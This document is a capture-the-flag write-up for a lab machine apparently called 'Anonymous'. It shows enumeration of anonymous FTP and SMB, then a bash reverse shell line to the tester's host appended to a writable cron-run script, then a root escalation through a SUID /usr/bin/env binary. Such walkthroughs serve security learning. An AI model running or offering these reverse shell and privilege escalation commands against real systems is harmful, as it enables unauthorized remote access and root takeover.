
# Anonymous

## Enumeration

Initial scanning with **Nmap** revealed the following open ports:

```
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.23.124.231
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

SMB enumeration:

```bash
smbclient -L //10.10.228.70 -N 
```

Discovered a share called `pics`. Downloaded contents:

```bash
smbclient //10.10.228.70/pics -N -c 'prompt OFF; recurse ON; mget *' 
```

The share only contained unhelpful images.

Next, I downloaded all FTP contents:

```bash
wget -m --no-passive ftp://anonymous:anonymous@10.10.228.70
```

Among the downloaded files, two were important: `clean.sh` and `removed_files.log`.

- `clean.sh` is a script that deletes files periodically and logs actions to `removed_files.log`.
- Observed that `removed_files.log` grows over time, confirming `clean.sh` runs periodically.

## Reverse Shell

Appended a reverse shell to `clean.sh`:

```sh
bash -i >& /dev/tcp/10.23.124.231/4444 0>&1
```

Uploaded the modified script via FTP:

![upload](screenshots/upload_rev_shell.png)

Started a Netcat listener and gained a reverse shell:

![rev_shell](screenshots/rev_shell.png)

---

## Privilege Escalation

Using **LinPEAS**, found a potential privilege escalation vector:

![priv](screenshots/priv_esc_vector.png)

The binary `/usr/bin/env` has the SUID bit set. This allows commands executed through it to run with root privileges.

Gained root access using:

```bash
/usr/bin/env cp /bin/bash /tmp/rootbash
/usr/bin/env chmod +s /tmp/rootbash
/tmp/rootbash -p
```

Proof of root access:

![root](screenshots/root.png)

---
